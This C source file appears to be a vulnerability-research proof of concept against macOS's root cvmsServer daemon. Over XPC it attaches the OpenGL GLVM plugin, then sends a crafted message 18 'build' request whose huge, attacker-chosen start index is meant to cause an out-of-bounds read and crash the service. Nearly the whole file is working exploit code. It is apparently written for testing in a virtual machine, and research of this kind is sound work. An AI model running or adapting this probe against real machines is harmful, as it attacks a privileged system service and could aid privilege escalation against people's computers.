// cvmsServer msg18 BUILD -> GLVM transform builder (kind 0x0f..0x13) OOB-read probe
// Reachable: known-good 0x2014 OpenGL attach + msg18 build. Root cvmsServer crash candidate. VM-only.
#include <xpc/xpc.h>
#include <dispatch/dispatch.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

static void on_alarm(int s){(void)s;_exit(124);}
static void dump(const char*l,xpc_object_t o){ if(!o){printf("%s: no reply\n",l);return;} char*d=xpc_copy_description(o); printf("%s: %s\n",l,d?d:"?"); free(d);}
static xpc_object_t ssync(xpc_connection_t c,xpc_object_t m,unsigned t){ alarm(t); xpc_object_t r=xpc_connection_send_message_with_reply_sync(c,m); alarm(0); return r;}
static xpc_connection_t open_conn(void){
  xpc_connection_t c=xpc_connection_create_mach_service("com.apple.cvmsServ",NULL,0); if(!c)return NULL;
  xpc_connection_set_event_handler(c,^(xpc_object_t e){ char*d=xpc_copy_description(e); fprintf(stderr,"event: %s\n",d?d:"?"); free(d);});
  xpc_connection_resume(c); return c;
}
static void create1(xpc_connection_t c){ xpc_object_t m=xpc_dictionary_create(NULL,NULL,0); xpc_dictionary_set_int64(m,"message",1); xpc_object_t r=ssync(c,m,5); if(r)xpc_release(r); xpc_release(m);}
static int attach(xpc_connection_t c){
  unsigned char args[16]={0,0,0,0,0,0,0,0, 4,0,0,0, 0x14,0x20,0,0}; // known-good 0x2014
  xpc_object_t m=xpc_dictionary_create(NULL,NULL,0);
  xpc_dictionary_set_int64(m,"message",4);
  xpc_dictionary_set_string(m,"framework_name","OpenGL");
  xpc_dictionary_set_string(m,"bitcode_name","");
  xpc_dictionary_set_string(m,"plugin_name","/System/Library/Frameworks/OpenGL.framework/Libraries/libGLVMPlugin.dylib");
  xpc_dictionary_set_data(m,"args",args,sizeof(args));
  xpc_object_t r=ssync(c,m,10); int ok=r&&(xpc_dictionary_get_int64(r,"error")==0); dump("attach",r); if(r)xpc_release(r); xpc_release(m); return ok?0:-1;
}
static void build_transform(xpc_connection_t c,uint16_t kind,uint32_t startidx){
  uint8_t s0[4]; memset(s0,0,4);
  memcpy(s0,&kind,2); // pass_count=0 at s0[2]
  uint8_t s1[0x40]; memset(s1,0,sizeof(s1));
  uint8_t s2[0x100]; memset(s2,0,sizeof(s2));
  uint32_t end=0;
  memcpy(s2+0x6c,&startidx,4); // start index (attacker, huge -> OOB)
  memcpy(s2+0x7c,&end,4);      // end index (!= start)
  uint32_t big=0x20000000;
  memcpy(s2+0x70,&big,4);      // the +0x70 field read before indexing

  xpc_object_t src=xpc_array_create(NULL,0);
  xpc_object_t d0=xpc_data_create(s0,sizeof(s0)), d1=xpc_data_create(s1,sizeof(s1)), d2=xpc_data_create(s2,sizeof(s2));
  xpc_array_append_value(src,d0); xpc_array_append_value(src,d1); xpc_array_append_value(src,d2);
  xpc_release(d0); xpc_release(d1); xpc_release(d2);

  xpc_object_t m=xpc_dictionary_create(NULL,NULL,0);
  xpc_dictionary_set_int64(m,"message",18);
  xpc_dictionary_set_uint64(m,"options",0);
  xpc_dictionary_set_value(m,"source",src); xpc_release(src);
  xpc_object_t r=ssync(c,m,8);
  printf("build kind=0x%x start=0x%x -> %s\n", kind, startidx, r?(xpc_dictionary_get_value(r,"error")?"error":"ok"):"NO-REPLY(crash?)");
  if(r)xpc_release(r); xpc_release(m);
}
int main(int argc,char**argv){
  signal(SIGALRM,on_alarm); setvbuf(stdout,NULL,_IONBF,0);
  uint16_t kind = (argc>1)?(uint16_t)strtoul(argv[1],0,0):0x0f;
  uint32_t start= (argc>2)?(uint32_t)strtoul(argv[2],0,0):0x20000000;
  xpc_connection_t c=open_conn(); if(!c){fprintf(stderr,"no conn\n");return 1;}
  create1(c);
  if(attach(c)!=0){fprintf(stderr,"attach failed\n");return 2;}
  build_transform(c,kind,start);
  xpc_connection_cancel(c); xpc_release(c);
  return 0;
}
